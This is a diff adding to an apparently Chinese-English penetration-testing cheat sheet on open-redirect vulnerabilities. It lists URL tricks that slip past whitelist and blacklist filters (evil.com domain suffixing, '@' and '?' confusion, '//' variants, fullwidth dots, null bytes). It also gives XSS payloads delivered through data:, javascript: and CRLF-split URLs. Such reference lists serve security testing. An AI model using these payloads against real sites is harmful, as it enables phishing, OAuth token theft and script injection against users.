@@ -5,3 +5,57 @@ Exploit方向：
   OAuth token disclosure
   XSS
   CRLF injection
+  
+绕过方法：
+白名单方式过滤：
+1. 域名重构 
+Using a whitelisted domain or keyword
+www.whitelisted.com.evil.com redirect to evil.com
+
+Creating folder as their domain
+http://www.yoursite.com/http://www.theirsite.com/
+http://www.yoursite.com/folder/www.folder.com
+
+2. 参数重构
+Using parameter pollution
+?next=whitelisted.com&next=google.com
+
+Using "@" character, browser will redirect to anything after the "@"
+http://www.theirsite.com@yoursite.com/
+
+Using "?" characted, browser will translate it to "/?"
+http://www.yoursite.com?http://www.theirsite.com/
+http://www.yoursite.com?folder/www.folder.com
+
+黑名单方式过滤：
+Using "//" & "////" to bypass "http" blacklisted keyword
+//google.com
+////google.com
+
+Using "https:" to bypass "//" blacklisted keyword
+https:google.com
+
+Using "//" to bypass "//" blacklisted keyword (Browsers see // as //)
+\/\/google.com/
+/\/google.com/
+
+Using "%E3%80%82" to bypass "." blacklisted character
+/?redir=google。com
+//google%E3%80%82com
+
+Using null byte "%00" to bypass blacklist filter
+//google%00.com
+
+XSS绕过：
+XSS from Open URL - If it's in a JS variable
+";alert(0);//
+
+XSS from data:// wrapper
+http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+
+XSS from javascript:// wrapper
+http://www.example.com/redirect.php?url=javascript:prompt(1)
+
+Using CRLF to bypass "javascript" blacklisted keyword
+java%0d%0ascript%0d%0a:alert(0)
+
